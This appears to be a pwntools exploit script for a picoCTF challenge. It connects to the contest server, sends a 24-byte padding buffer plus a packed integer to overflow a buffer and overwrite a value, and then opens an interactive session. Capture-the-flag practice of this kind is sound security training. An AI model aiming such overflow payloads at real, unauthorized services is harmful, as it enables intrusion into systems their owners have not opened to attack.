from  pwn import *

p = remote('saturn.picoctf.net', 57568)

buffer = b"A" *24
num = p64(65)

pay = buffer + num

p.sendlineafter(b": ", pay)

p.interactive()
